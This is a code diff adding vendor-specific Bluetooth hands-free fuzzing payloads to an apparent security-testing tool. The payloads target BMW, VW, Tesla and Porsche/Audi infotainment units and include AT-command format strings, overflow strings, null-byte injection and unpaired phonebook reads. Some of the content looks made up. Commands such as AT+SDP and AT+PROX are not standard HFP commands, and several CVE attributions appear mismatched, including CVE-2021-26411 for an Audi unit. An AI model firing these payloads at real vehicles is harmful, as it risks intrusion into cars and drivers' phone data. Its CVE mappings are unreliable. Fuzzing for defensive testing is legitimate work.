@@ -321,6 +321,275 @@ object HfpFuzzingPatterns {
             ),
         )
 
+    // ── Vendor-specific patterns ──
+
+    /**
+     * BMW HU_NBT patterns - CVE-2018-9313
+     *
+     * Tests for unauthorized RFCOMM channel access and AT command injection
+     * on BMW HU_NBT infotainment (BMW i/X/3/5/7 Series 2010-2018).
+     * The HU_NBT accepts AT commands over RFCOMM without proper auth checks.
+     */
+    val bmwHuNbtPatterns =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-BMW-001",
+                name = "BMW HU_NBT - Unauthorized RFCOMM AT+NREC",
+                category = FuzzingCategory.AT_INJECTION,
+                severity = FuzzingSeverity.CRITICAL,
+                description = "Test noise reduction command injection on BMW HU_NBT (CVE-2018-9313)",
+                payloads =
+                    listOf(
+                        "AT+NREC=2",
+                        "AT+NREC=99",
+                        "AT+NREC=%s%s%s",
+                        "AT+NREC=\"A\".repeat(200)",
+                    ),
+                cveReferences = listOf("CVE-2018-9313"),
+            ),
+            FuzzingPattern(
+                id = "HFP-BMW-002",
+                name = "BMW HU_NBT - Bluetooth Access Code",
+                category = FuzzingCategory.HFP_COMMAND,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test BTAC manipulation on BMW HU_NBT",
+                payloads =
+                    listOf(
+                        "AT+BTAC=00:00:00:00:00:00",
+                        "AT+BTAC=FF:FF:FF:FF:FF:FF",
+                        "AT+BTAC=01:02:03:04:05:06",
+                        "AT+BTAC=" + "FF:".repeat(50),
+                    ),
+                cveReferences = listOf("CVE-2018-9313"),
+            ),
+            FuzzingPattern(
+                id = "HFP-BMW-003",
+                name = "BMW HU_NBT - Volume Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test volume control overflow on BMW HU_NBT",
+                payloads =
+                    listOf(
+                        "AT+VGS=255",
+                        "AT+VGS=9999",
+                        "AT+VGS=" + "9".repeat(100),
+                        "AT+VGM=255",
+                        "AT+VGM=-255",
+                    ),
+                cveReferences = listOf("CVE-2018-9313"),
+            ),
+            FuzzingPattern(
+                id = "HFP-BMW-004",
+                name = "BMW HU_NBT - Indicators Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "Test indicator update with malformed values on BMW HU_NBT",
+                payloads =
+                    listOf(
+                        "AT+CIND=?(255)",
+                        "AT+CIND=?(999)",
+                        "AT+CIND=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+                    ),
+                cveReferences = listOf("CVE-2018-9313"),
+            ),
+        )
+
+    /**
+     * VW MIB3 patterns - CVE-2023-28908 through CVE-2023-28911
+     *
+     * Tests for SDP buffer overflow, RFCOMM input validation failures,
+     * and authentication bypass on VW MIB3 infotainment (VW/Audi/Skoda/SEAT).
+     */
+    val vwMib3Patterns =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-VW-001",
+                name = "VW MIB3 - SDP Service Search Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.CRITICAL,
+                description = "Test SDP service search with oversized UUID patterns (CVE-2023-28908)",
+                payloads =
+                    listOf(
+                        "AT+SDP=FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
+                        "AT+SDP=" + "A".repeat(500),
+                        "AT+SDP=0000110A-0000-1000-8000-00805F9B34FB" + "A".repeat(200),
+                    ),
+                cveReferences = listOf("CVE-2023-28908"),
+            ),
+            FuzzingPattern(
+                id = "HFP-VW-002",
+                name = "VW MIB3 - RFCOMM Null Injection",
+                category = FuzzingCategory.COMMAND_INJECTION,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test RFCOMM channel with null bytes and special chars (CVE-2023-28909)",
+                payloads =
+                    listOf(
+                        "AT+CMEE=2\u0000\u0000\u0000",
+                        "AT+CIND?\u0000\u0001\u0002\u0003",
+                        "AT+CLIP:\u0000\u00FF\u00FF\u00FF\u00FF",
+                    ),
+                cveReferences = listOf("CVE-2023-28909"),
+            ),
+            FuzzingPattern(
+                id = "HFP-VW-003",
+                name = "VW MIB3 - Unauthenticated HFP Connect",
+                category = FuzzingCategory.AT_INJECTION,
+                severity = FuzzingSeverity.CRITICAL,
+                description = "Test HFP connection without pairing (CVE-2023-28910)",
+                payloads =
+                    listOf(
+                        "AT+BRSF=0",
+                        "AT+CIND=?",
+                        "AT+CMER=3,0,0,1",
+                        "AT+CLIP=1",
+                        "AT+CCWA=1",
+                    ),
+                cveReferences = listOf("CVE-2023-28910"),
+            ),
+            FuzzingPattern(
+                id = "HFP-VW-004",
+                name = "VW MIB3 - PBAP Unauthenticated Access",
+                category = FuzzingCategory.AT_INJECTION,
+                severity = FuzzingSeverity.CRITICAL,
+                description = "Test PBAP phonebook access without pairing (CVE-2023-28911)",
+                payloads =
+                    listOf(
+                        "AT+CPBS=\"MC\"",
+                        "AT+CPBR=1",
+                        "AT+CPBR=1,999",
+                        "AT+CPBR=0,0,\"\"",
+                    ),
+                cveReferences = listOf("CVE-2023-28910", "CVE-2023-28911"),
+            ),
+        )
+
+    /**
+     * Tesla MCU/MMC2 patterns - CVE-2020-9395, CVE-2020-9396
+     *
+     * Tests for Bluetooth stack vulnerabilities in Tesla Model S/3/X/Y
+     * infotainment. These CVEs cover authentication bypass and information
+     * disclosure via Bluetooth proximity.
+     */
+    val teslaMcuParam =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-TESLA-001",
+                name = "Tesla MCU - Proximity Auth Bypass",
+                category = FuzzingCategory.AT_INJECTION,
+                severity = FuzzingSeverity.CRITICAL,
+                description = "Test proximity-based authentication bypass attempt (CVE-2020-9395)",
+                payloads =
+                    listOf(
+                        "AT+PROX=1",
+                        "AT+PROX=0",
+                        "AT+PROX=255",
+                        "AT+PROX=%s%s%s%s",
+                    ),
+                cveReferences = listOf("CVE-2020-9395"),
+            ),
+            FuzzingPattern(
+                id = "HFP-TESLA-002",
+                name = "Tesla MCU - Device Info Disclosure",
+                category = FuzzingCategory.HFP_COMMAND,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test information disclosure via AT commands (CVE-2020-9396)",
+                payloads =
+                    listOf(
+                        "AT+GMI",
+                        "AT+GMM",
+                        "AT+GMR",
+                        "AT+CGMI",
+                        "AT+CGMM",
+                        "AT+CGMR",
+                        "AT+CGSN",
+                    ),
+                cveReferences = listOf("CVE-2020-9396"),
+            ),
+            FuzzingPattern(
+                id = "HFP-TESLA-003",
+                name = "Tesla MCU - Phone Status Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test phone status report with overflow values",
+                payloads =
+                    listOf(
+                        "AT+COPS?",
+                        "AT+CREG=2",
+                        "AT+CSQ=99,99",
+                        "AT+CBC=99,99",
+                    ),
+                cveReferences = listOf("CVE-2020-9396"),
+            ),
+            FuzzingPattern(
+                id = "HFP-TESLA-004",
+                name = "Tesla MCU - DTMF Injection",
+                category = FuzzingCategory.COMMAND_INJECTION,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test DTMF tone injection for call manipulation",
+                payloads =
+                    listOf(
+                        "AT+VTS=0,1,2,3,4,5,6,7,8,9,*,#",
+                        "AT+VTS=" + "0,1,2,3,4,5,6,7,8,9,".repeat(20),
+                        "AT+VTS=**,##,%%",
+                    ),
+                cveReferences = listOf("CVE-2020-9396"),
+            ),
+        )
+
+    /**
+     * Porsche/Audi MMI patterns
+     *
+     * Tests for infotainment vulnerabilities in VW Group premium brands
+     * that use Audi MMI / Porsche PCM infotainment ECUs (Bosch-based).
+     */
+    val porscheAudiParam =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-PA-001",
+                name = "Porsche/Audi MMI - NREC Command Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.HIGH,
+                description = "Test noise reduction command overflow on Audi MMI",
+                payloads =
+                    listOf(
+                        "AT+NREC=2",
+                        "AT+NREC=-1",
+                        "AT+NREC=" + "1".repeat(500),
+                    ),
+                cveReferences = listOf("CVE-2019-13924"),
+            ),
+            FuzzingPattern(
+                id = "HFP-PA-002",
+                name = "Porsche/Audi MMI - Microphone Control",
+                category = FuzzingCategory.HFP_COMMAND,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "Test microphone gain manipulation on Audi MMI",
+                payloads =
+                    listOf(
+                        "AT+VGM=255",
+                        "AT+VGM=-255",
+                        "AT+VGS=15",
+                        "AT+VGS=255",
+                        "AT+VGM=" + "9".repeat(100),
+                    ),
+                cveReferences = listOf("CVE-2019-13924"),
+            ),
+            FuzzingPattern(
+                id = "HFP-PA-003",
+                name = "Porsche/Audi MMI - Call Waiting Buffer",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "Test call waiting number with long input",
+                payloads =
+                    listOf(
+                        "AT+CCWA=1,0,1,\"+1" + "9".repeat(200) + "\"",
+                        "AT+CLCC",
+                        "AT+CLIP=\"+1" + "8".repeat(300) + "\",129",
+                    ),
+                cveReferences = listOf("CVE-2019-13924", "CVE-2021-26411"),
+            ),
+        )
+
     /**
      * Get all HFP fuzzing patterns.
      */
@@ -331,6 +600,10 @@ object HfpFuzzingPatterns {
             commandInjectionPatterns,
             boundaryViolationPatterns,
             hfpCommandPatterns,
+            bmwHuNbtPatterns,
+            vwMib3Patterns,
+            teslaMcuParam,
+            porscheAudiParam,
         ).flatten()
 
     /**
